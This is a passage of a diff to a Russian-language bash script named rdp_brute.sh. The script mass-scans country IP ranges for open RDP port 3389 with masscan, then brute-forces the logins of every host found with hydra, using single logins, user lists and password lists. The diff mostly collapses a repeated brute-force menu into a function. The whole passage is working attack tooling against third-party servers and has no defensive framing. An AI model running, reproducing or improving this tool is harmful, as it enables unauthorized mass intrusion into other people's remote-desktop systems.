-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4054,6 +1786,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4063,53 +1796,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4127,6 +1814,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4136,53 +1824,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4200,6 +1842,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4209,53 +1852,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4273,6 +1870,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4282,53 +1880,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4346,6 +1898,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4355,53 +1908,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4419,6 +1926,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4428,53 +1936,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4492,6 +1954,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4501,53 +1964,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4565,6 +1982,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4574,53 +1992,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4638,6 +2010,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4647,53 +2020,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4711,6 +2038,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4720,53 +2048,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4784,6 +2066,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4793,53 +2076,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4857,6 +2094,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4866,53 +2104,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -4930,6 +2122,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -4939,53 +2132,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "64" ]; then
@@ -5002,6 +2149,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -5011,53 +2159,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
